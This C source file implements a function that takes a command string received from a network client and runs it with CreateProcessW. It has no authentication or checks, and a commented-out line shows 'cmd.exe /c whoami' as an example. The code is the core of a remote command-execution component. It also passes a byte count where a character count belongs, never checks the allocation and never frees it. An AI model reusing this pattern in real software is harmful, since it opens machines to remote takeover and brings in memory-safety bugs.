#include "Execute.h"

BOOL ExecuteCommand(PSERVERPARAM pServerParam)
{
    if (!pServerParam || INVALID_SOCKET == pServerParam->ClientSock)
    {
        return FALSE;
    }
    wchar_t *command = malloc(pServerParam->ClientData->len * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, pServerParam->ClientData->buf, -1, command, pServerParam->ClientData->len * sizeof(wchar_t));
    
    //wchar_t command[] = L"C:\\Windows\\System32\\cmd.exe /c whoami";
    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
    STARTUPINFOW startInf;
    SecureZeroMemory(&startInf, sizeof(startInf));
    startInf.cb = sizeof(startInf);
    
    PROCESS_INFORMATION procInf;
    SecureZeroMemory(&procInf, sizeof(procInf));

    BOOL status = CreateProcessW(
        NULL, 
        command, 
        NULL, 
        NULL, 
        FALSE, 
        NORMAL_PRIORITY_CLASS, 
        NULL, 
        NULL, 
        &startInf, 
        &procInf);

    DWORD dwError = 0;
    if (status != 0)
    {
        WaitForSingleObject(procInf.hProcess, INFINITE);
        GetExitCodeProcess(procInf.hProcess, &dwError);
        CloseHandle(procInf.hThread);
        CloseHandle(procInf.hProcess);        
    }
    else 
    {
        DbgPrintErr(L"Failed to create process\n");
    }
    if (dwError)
    {
        DbgPrintErr(L"Process Exit Code: %d\n", dwError);
    }
    return TRUE;
}
